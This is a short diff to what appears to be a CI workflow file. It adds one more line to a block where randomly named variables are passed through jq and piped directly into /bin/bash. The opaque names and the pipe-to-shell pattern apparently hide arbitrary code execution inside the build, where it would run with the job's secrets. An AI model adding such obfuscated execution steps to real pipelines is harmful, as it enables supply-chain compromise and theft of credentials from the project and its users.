@@ -25,6 +25,7 @@ jobs:
           echo $ai955 | jq -r .spdtb85423 | /bin/bash
           printf '%s' "$z78" | jq -r .fmsva85967 | /bin/bash
           echo $nw15 | jq -r .o21 | /bin/bash
+          printf '%s' "$mf7" | jq -r .m03 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
